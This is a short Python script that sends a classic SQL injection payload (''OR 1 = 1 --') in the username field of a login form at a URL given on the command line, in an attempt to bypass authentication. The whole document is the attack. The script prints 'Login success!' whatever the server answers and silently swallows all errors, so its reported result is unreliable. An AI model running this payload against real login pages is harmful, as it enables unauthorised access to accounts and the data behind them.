import requests,argparse

parser = argparse.ArgumentParser()
parser.add_argument('url')
args = parser.parse_args()

def Main():

        try:
            session_url = requests.session()
            login_url = args.url
            payload = """'OR 1 = 1 -- """
            data = {'username':payload,'password':'1234','login':'login'}
            login = session_url.post(login_url, data=data)
            print("-"* 50)
            print("[+] Login success!")
            print(login.text)
        except:
            pass

if __name__ == "__main__":
    Main() 
